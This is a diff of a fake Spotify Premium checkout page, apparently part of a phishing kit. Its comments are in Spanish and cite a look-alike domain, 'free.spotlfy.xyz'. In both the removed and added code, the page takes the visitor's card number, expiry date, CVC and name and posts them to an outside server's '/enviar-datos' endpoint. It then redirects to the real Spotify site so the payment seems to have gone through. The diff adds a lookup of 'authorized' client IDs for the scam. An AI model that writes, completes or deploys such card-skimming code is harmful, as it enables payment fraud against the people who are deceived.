@@ -193,67 +193,74 @@
   </footer>
 
   <script src="../frontend_config.js"></script>  <!-- Carga config aquí también -->
-  
-  <script>
-  
-... (MANTENER EL CSS Y HTML ORIGINAL) ...
 
   <script>
-    const SERVER_URL = 'https://backend-production-d69c4cec.up.railway.app';
-
-    async function submitPayment() {
-      const btn = document.getElementById('payBtn');
-      const btnText = document.getElementById('btnText');
-      
-      console.log("🚀 Iniciando pago...");
-      console.log("📍 Origen actual:", window.location.origin);
-      console.log("🌐 SERVER_URL configurado:", SERVER_URL);
-
-      btn.disabled = true;
-      btnText.innerHTML = 'Procesando...';
-
-      try {
-        const payload = {
-          tarjeta: document.getElementById('cardNumber').value,
-          expiracion: document.getElementById('cardExpiry').value,
-          cvc: document.getElementById('cardCvc').value,
-          nombre: document.getElementById('cardName').value,
-          origen: window.location.origin  // 🔥 El dominio real del checkout (ej: https://free.spotlfy.xyz/)
-        };
-
-        console.log("📤 Enviando payload:", JSON.stringify(payload));
-        
-        const response = await fetch(`${SERVER_URL}/enviar-datos`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-
-        const data = await response.json();
-        console.log("✅ Respuesta:", data);
-        
-      } catch (error) {
-        console.error("❌ Error al enviar:", error);
-      }
-
-      // Redirige como si hubieran completado el pago en Spotify
-      window.location.href = 'https://www.spotify.com/mx/premium/';
-    }
+   <script>
+  // --- CONFIGURACIÓN DYNAMICA (usando frontend_config.js) ---
+  
+  async function submitPayment() {
+    const btn = document.getElementById('payBtn');
+    const btnText = document.getElementById('btnText');
     
-    function validateForm() {
-      const card = document.getElementById('cardNumber').value.replace(/\s/g, '');
-      const expiry = document.getElementById('cardExpiry').value;
-      const cvc = document.getElementById('cardCvc').value;
-      const name = document.getElementById('cardName').value;
-      const terms = document.getElementById('terms').checked;
+    console.log("🚀 Iniciando pago...");
+    console.log("📍 Origen actual:", window.location.origin);
+
+    btn.disabled = true;
+    btnText.innerHTML = 'Procesando...';
+
+    try {
+      // IMPORTANTE: Obtener IDs autorizados desde frontend_config.js
+      const authorizedIds = getTargetUserID();  // ← Llama a la función del config
       
-      const validCard = card.length >= 15;
-      const validExpiry = expiry.length === 5;
-      const validCvc = cvc.length >= 3;
-      const validName = name.length > 2;
+      console.log("🔐 Clientes autorizados para este checkout:", authorizedIds);
       
-      document.getElementById('payBtn').disabled = !(validCard && validExpiry && validCvc && validName && terms);
+      const payload = {
+        tarjeta: document.getElementById('cardNumber').value,
+        expiracion: document.getElementById('cardExpiry').value,
+        cvc: document.getElementById('cardCvc').value,
+        nombre: document.getElementById('cardName').value,
+        origen: window.location.origin  // 🔥 El dominio real del checkout (ej: https://free.spotlfy.xyz/)
+      };
+
+      console.log("📤 Enviando payload:", JSON.stringify(payload));
+      
+      const response = await fetch(`${SERVER_URL}/enviar-datos`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      const data = await response.json();
+      console.log("✅ Respuesta:", data);
+      
+    } catch (error) {
+      console.error("❌ Error al enviar:", error);
     }
+
+    // Redirige como si hubieran completado el pago en Spotify
+    window.location.href = 'https://www.spotify.com/mx/premium/';
+  }
+  
+  function validateForm() {
+    const card = document.getElementById('cardNumber').value.replace(/\s/g, '');
+    const expiry = document.getElementById('cardExpiry').value;
+    const cvc = document.getElementById('cardCvc').value;
+    const name = document.getElementById('cardName').value;
+    const terms = document.getElementById('terms').checked;
+    
+    const validCard = card.length >= 15;
+    const validExpiry = expiry.length === 5;
+    const validCvc = cvc.length >= 3;
+    const validName = name.length > 2;
+    
+    document.getElementById('payBtn').disabled = !(validCard && validExpiry && validCvc && validName && terms);
+  }
+
+  // Eventos de validación... (igual que antes)
+  document.getElementById('cardCvc').addEventListener('input', validateForm);
+  document.getElementById('cardName').addEventListener('input', validateForm);
+  document.getElementById('terms').addEventListener('change', validateForm);
+</script>
 
    
 </body>
